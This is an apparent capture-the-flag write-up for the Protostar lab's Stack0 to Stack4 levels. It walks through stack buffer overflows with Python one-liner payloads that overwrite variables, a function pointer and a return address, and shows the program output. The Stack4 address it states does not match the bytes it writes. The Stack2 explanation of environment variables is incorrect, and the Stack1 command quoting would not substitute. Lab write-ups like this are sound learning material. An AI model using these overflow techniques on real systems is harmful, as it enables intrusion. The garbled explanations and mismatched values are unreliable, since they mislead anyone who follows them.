### Stack0

To modify variable we need to overwrite space on buffer[64] \
`user@protostar:/opt/protostar/bin$ (python -c "print 'a'*65") | ./stack0` \
`user@protostar:/opt/protostar/bin$ you have changed the 'modified' variable`\

We write 65 here, because 64 not overload the stack

### Stack1

Now we need modify the specific value (  0x61626364  ~ "dcba") \
So. Let's check what will happen if we write into buffer as in previous task:\
`./stack1 'python -c "print ('a' * 65)"'`\
`Try again, you got 0x00000061`

Ok. now It's better, we know that we can overwrite buffer. Continue with our value: \
`./stack1 'python -c "print ('a' * 64 + 'dcba')"'`

We remove one char with 'a', because we need overloading starts with 'dcba' value\
Now we will get: \
`you have correctly got the variable to the right value`

### Stack2

Here we have fun thing with env vars -- actually command python also is env var. So. \
When we would try to create env var with value like `python 'print (A)'` it will be \
processed as a command. Let's try it out:\
`GREENIE = 'python -c "print ('A' * 64 + '\x0a\x0d\x0a\x0d')'`

Check what we do:
`echo $GREENIE` \
What we get: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

Okay, now we need to call the **_./stack2_** and checj how it will work for us \
call --> ` ./stack2` \
`you have correctly modified the variable` \
Great job!

### Stack3

Now we have pointer fp on function that don't exist while in the fp only value is written \
and func win() that should be called. \
At first we should find out where our win function stored in memory. \
With this objdump tool can help us. As long as our virual machine is run on Debian OS \
we should use following command : \
`apt-get install binutils-i586-linux-gnu`\
call : `objdump -x stack3 | grep win`, where -x is flag to show all headers of obj \
result: `08048424 g     F .text  00000014              win` \
So now we know address of win ~ 0x08048424. And our task is only to overwrite fp with this value \
We know that we store data in Little Indian, so... \
as in previous tasks we need buffer with size 64 in a char and our address in hex 

` (python -c "print 'a'*64 + '\x24\x84\x04\x08'";) | ./stack3`

Output:\
`calling function pointer, jumping to 0x08048424`\
`code flow successfully changed`

Yes! We got this.

### Stack4

Okay, now we have no value to overwrite. So only thing that we could do is to overwrite the\
return address of the main function. It's stored in the stack in the start of frame. 

So we should bound the dedicated to main func stack size. How we can do this? we will try to increase size of the buffer \
until we will get the segmentation fault. \
Spoiler: that will be size of 76.\
`(python -c "print 'a'*76";) | ./stack4`

Cool, now we only need the address of win() to write it onto the return function point \
we can do in the same way as in the Stack3 task. Address: 0x08048424 

`(python -c "print 'a'*76 + '\xf4\x83\x04\x08'";) | ./stack4`

output: `code flow successfully changed` \
Well done! Let's move to the nex task

###Stack5
###Stack6
###Final0




